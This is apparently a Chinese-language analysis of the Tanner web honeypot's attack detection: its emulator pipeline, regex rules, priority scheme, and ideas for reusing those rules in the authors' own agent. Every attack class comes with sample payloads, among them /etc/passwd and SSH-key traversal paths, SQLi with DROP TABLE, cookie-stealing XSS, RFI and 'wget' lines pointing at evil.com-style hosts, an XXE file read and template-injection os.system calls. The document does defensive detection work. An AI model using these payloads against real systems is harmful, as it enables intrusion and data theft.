# Tanner 攻擊偵測機制分析

## 整體架構

Tanner 使用**模組化 Emulator 系統**來偵測和模擬不同類型的攻擊。每個攻擊類型都有獨立的 Emulator 模組。

### 處理流程

```
Snare 發送請求 → Tanner Server (server.py)
    ↓
handle_event() 接收請求
    ↓
BaseHandler.handle() 開始處理
    ↓
檢查 HTTP Method (GET/POST)
    ↓
遍歷所有 Emulator 的 scan() 方法
    ↓
根據 order 值選擇優先級最高的攻擊
    ↓
呼叫對應 Emulator 的 handle() 方法
    ↓
返回 detection 結果
```

## 支援的攻擊類型

Tanner 支援以下 10 種攻擊類型：

| 攻擊類型 | 優先級 (Order) | 啟用狀態 | 說明 |
|---------|---------------|---------|------|
| **SQLi** (SQL Injection) | 2 | ✅ | SQL 注入攻擊 |
| **RFI** (Remote File Inclusion) | 2 | ✅ | 遠端檔案包含 |
| **LFI** (Local File Inclusion) | 2 | ❌ | 本地檔案包含 |
| **XSS** (Cross-Site Scripting) | 3 | ✅ | 跨站腳本攻擊 |
| **CMD_EXEC** (Command Execution) | 3 | ❌ | 命令執行 |
| **PHP Code Injection** | 2 | ✅ | PHP 程式碼注入 |
| **PHP Object Injection** | 2 | ✅ | PHP 物件注入 |
| **CRLF** | 2 | ✅ | CRLF 注入 |
| **XXE Injection** | 2 | ✅ | XML 外部實體注入 |
| **Template Injection** | 2 | ❌ | 模板注入 |

> **注意**: 配置檔案中 LFI 和 CMD_EXEC 被設為 `False`，但實際上還是會進行偵測，只是不會執行模擬。

## 攻擊偵測規則

所有偵測規則定義在 `/opt/tanner/tanner/utils/patterns.py`

### 1. LFI (本地檔案包含)

**正則表達式**:
```python
LFI_ATTACK = re.compile(r".*(/\.\.)*(home|proc|usr|etc)/.*")
```

**偵測邏輯**:
- 檢查路徑是否包含 `../` 路徑遍歷
- 檢查是否嘗試存取系統目錄：`home`, `proc`, `usr`, `etc`

**範例攻擊**:
```
/?file=../../../../etc/passwd
/?page=../../home/user/.ssh/id_rsa
/?include=/proc/self/environ
```

**優先級**: Order = 2

---

### 2. SQLi (SQL 注入)

**偵測方法**: 使用 `pylibinjection` 函式庫進行偵測

```python
def scan(self, value):
    detection = None
    payload = bytes(value, "utf-8")
    sqli = pylibinjection.detect_sqli(payload)
    if int(sqli["sqli"]):
        detection = dict(name="sqli", order=2)
    return detection
```

**偵測邏輯**:
- 使用專業的 libinjection 函式庫
- 能偵測各種 SQL 注入變種
- 包括 Union-based, Boolean-based, Time-based 等

**範例攻擊**:
```
/?id=1' OR '1'='1
/?id=1 UNION SELECT username, password FROM users
/?id=1'; DROP TABLE users--
```

**優先級**: Order = 2

---

### 3. XSS (跨站腳本攻擊)

**正則表達式**:
```python
XSS_ATTACK = re.compile(r".*<(.|\n)*?>")
```

**偵測邏輯**:
- 檢查是否包含 HTML 標籤 `<...>`
- 可以跨行比對

**範例攻擊**:
```
/?name=<script>alert('XSS')</script>
/?comment=<img src=x onerror=alert(1)>
/?search=<svg onload=alert(document.cookie)>
```

**優先級**: Order = 3

---

### 4. RFI (遠端檔案包含)

**正則表達式**:
```python
RFI_ATTACK = re.compile(r".*((http(s){0,1}|ftp(s){0,1}):).*", re.IGNORECASE)
```

**偵測邏輯**:
- 檢查是否包含外部 URL 協議
- 支援 `http://`, `https://`, `ftp://`, `ftps://`
- 不區分大小寫

**範例攻擊**:
```
/?page=http://evil.com/shell.txt
/?file=https://attacker.com/backdoor.php
/?include=ftp://malicious.net/exploit.txt
```

**優先級**: Order = 2

---

### 5. CMD_EXEC (命令執行)

**正則表達式**:
```python
CMD_ATTACK = re.compile(
    r".*[^A-z:./]"
    r"(alias|cat|cd|cp|echo|exec|find|for|grep|ifconfig|ls|man|mkdir|netstat|ping|ps|pwd|uname|wget|touch|while)"
    r"([^A-z:./]|\b)"
)
```

**偵測邏輯**:
- 檢查是否包含 Linux/Unix 常見命令
- 偵測的命令包括：
  - 檔案操作: `cat`, `cp`, `ls`, `mkdir`, `touch`, `find`
  - 系統資訊: `uname`, `pwd`, `ps`, `ifconfig`, `netstat`
  - 網路工具: `ping`, `wget`
  - 其他: `echo`, `exec`, `grep`, `for`, `while`

**範例攻擊**:
```
/?cmd=cat /etc/passwd
/?exec=ls -la /home
/?run=wget http://evil.com/shell.sh
/?input=; cat /etc/shadow
```

**優先級**: Order = 3

---

### 6. PHP Code Injection (PHP 程式碼注入)

**正則表達式**:
```python
PHP_CODE_INJECTION = re.compile(r".*(;)*(echo|system|print|phpinfo)(\(.*\)).*")
```

**偵測邏輯**:
- 檢查是否包含 PHP 危險函數
- 偵測函數: `echo`, `system`, `print`, `phpinfo`
- 必須有函數呼叫語法 `()`

**範例攻擊**:
```
/?cmd=system('whoami')
/?code=phpinfo()
/?exec=echo shell_exec('id')
```

**優先級**: Order = 2

---

### 7. PHP Object Injection (PHP 物件注入)

**正則表達式**:
```python
PHP_OBJECT_INJECTION = re.compile(r"(^|;|{|})O:[0-9]+:")
```

**偵測邏輯**:
- 檢查 PHP 序列化物件格式
- 格式: `O:數字:` (代表 Object)
- 可能在字串開頭或 `;`, `{`, `}` 之後

**範例攻擊**:
```
/?data=O:8:"stdClass":1:{s:4:"user";s:5:"admin";}
/?session=O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:0:"";}
```

**優先級**: Order = 2

---

### 8. CRLF Injection (CRLF 注入)

**正則表達式**:
```python
CRLF_ATTACK = re.compile(r".*(\r\n).*")
```

**偵測邏輯**:
- 檢查是否包含 `\r\n` (Carriage Return + Line Feed)
- 用於 HTTP Response Splitting 攻擊

**範例攻擊**:
```
/?redirect=http://example.com%0d%0aSet-Cookie:admin=true
/?url=/%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK
```

**優先級**: Order = 2

---

### 9. XXE Injection (XML 外部實體注入)

**正則表達式**:
```python
XXE_INJECTION = re.compile(r".*<(\?xml|(!DOCTYPE.*)).*>")
```

**偵測邏輯**:
- 檢查是否包含 XML 宣告 `<?xml`
- 檢查是否包含 DOCTYPE 定義

**範例攻擊**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**優先級**: Order = 2

---

### 10. Template Injection (模板注入)

**正則表達式**:
```python
TEMPLATE_INJECTION_MAKO = re.compile(r".*(<%.*|\s%>).*")
TEMPLATE_INJECTION_TORNADO = re.compile(r".*({{.*}}).*")
```

**偵測邏輯**:
- Mako 模板: 檢查 `<% ... %>` 語法
- Tornado 模板: 檢查 `{{ ... }}` 語法

**範例攻擊**:
```
/?name={{7*7}}
/?template=<% import os; os.system('whoami') %>
```

**優先級**: Order = 2

---

## 優先級機制

當一個請求匹配多個攻擊模式時，Tanner 會選擇 **優先級最高 (Order 值最大)** 的攻擊類型。

**優先級排序**:
- **Order 3**: XSS, CMD_EXEC
- **Order 2**: SQLi, RFI, LFI, PHP Code Injection, PHP Object Injection, CRLF, XXE, Template Injection
- **Order 1**: 一般頁面 (index, wp-content)

**範例**:
```
請求: /?cmd=<script>alert(1)</script>cat /etc/passwd

匹配結果:
- XSS (Order 3) ← 會選擇這個
- CMD_EXEC (Order 3)
```

## 檢查範圍

Tanner 會在以下位置檢查攻擊：

### GET 請求
檢查目標：
- URL 路徑
- GET 參數值
- Cookie 值

### POST 請求
檢查目標：
- POST 資料
- Cookie 值

### Cookie 專屬檢查
只有以下攻擊類型會檢查 Cookie：
- SQLi
- PHP Object Injection

## 實際範例

### 範例 1: LFI 攻擊

**請求**:
```http
GET /?file=../../../../etc/passwd HTTP/1.1
Host: localhost
User-Agent: nikto/2.0
```

**處理流程**:
1. BaseHandler 提取 GET 參數: `file=../../../../etc/passwd`
2. LFI Emulator 的 `scan()` 方法檢查
3. 匹配正則: `.*(/\.\.)*(home|proc|usr|etc)/.*`
4. 返回: `{"name": "lfi", "order": 2}`

**Detection 結果**:
```json
{
  "name": "lfi",
  "order": 2,
  "type": 1,
  "version": "0.6.0"
}
```

### 範例 2: SQL 注入

**請求**:
```http
GET /?id=1' OR '1'='1 HTTP/1.1
Host: localhost
```

**處理流程**:
1. 提取參數值: `1' OR '1'='1`
2. SQLi Emulator 使用 `pylibinjection.detect_sqli()`
3. libinjection 偵測到 SQL 注入模式
4. 返回: `{"name": "sqli", "order": 2}`

### 範例 3: XSS 攻擊

**請求**:
```http
GET /?search=<script>alert(document.cookie)</script> HTTP/1.1
```

**處理流程**:
1. 提取參數值: `<script>alert(document.cookie)</script>`
2. XSS Emulator 檢查
3. 匹配正則: `.*<(.|\n)*?>`
4. 返回: `{"name": "xss", "order": 3}`

## 對照：我們的實作 vs Tanner 原始邏輯

### 我們的簡化版偵測邏輯

```python
# agent.py 中的 _transform_json_record()
if 'lfi' in attack_type.lower() or '../' in path or '/etc/passwd' in path:
    attack_types.append('lfi')
if 'sqli' in attack_type.lower() or "'" in path or 'union' in path.lower():
    attack_types.append('sqli')
```

### Tanner 的完整邏輯

```python
# patterns.py
LFI_ATTACK = re.compile(r".*(/\.\.)*(home|proc|usr|etc)/.*")

# lfi.py
def scan(self, value):
    detection = None
    if patterns.LFI_ATTACK.match(value):
        detection = dict(name="lfi", order=2)
    return detection
```

### 建議改進

我們可以直接使用 Tanner 的正則表達式來提高準確度：

```python
import re

# 複製 Tanner 的 patterns
LFI_ATTACK = re.compile(r".*(/\.\.)*(home|proc|usr|etc)/.*")
XSS_ATTACK = re.compile(r".*<(.|\n)*?>")
CMD_ATTACK = re.compile(
    r".*[^A-z:./]"
    r"(alias|cat|cd|cp|echo|exec|find|for|grep|ifconfig|ls|man|mkdir|netstat|ping|ps|pwd|uname|wget|touch|while)"
    r"([^A-z:./]|\b)"
)

# 在 _transform_json_record() 中使用
if LFI_ATTACK.match(path):
    attack_types.append('lfi')
if XSS_ATTACK.match(path):
    attack_types.append('xss')
```

## 總結

### Tanner 的優勢
1. **專業的偵測引擎**: SQLi 使用 libinjection 函式庫
2. **完整的正則表達式**: 涵蓋各種攻擊變種
3. **優先級機制**: 當多個攻擊同時存在時選擇最重要的
4. **模組化設計**: 每個攻擊類型獨立 Emulator

### 改進建議
1. 將 Tanner 的正則表達式整合到我們的 Agent
2. 使用相同的優先級機制
3. 考慮使用 libinjection 提高 SQLi 偵測準確度
4. 支援更多攻擊類型（CRLF, XXE, Template Injection）

## 參考資源

- Tanner 原始碼: https://github.com/mushorg/tanner
- libinjection: https://github.com/client9/libinjection
- Tanner 配置檔案: `/opt/tanner/tanner/data/config.yaml`
- Tanner Patterns: `/opt/tanner/tanner/utils/patterns.py`
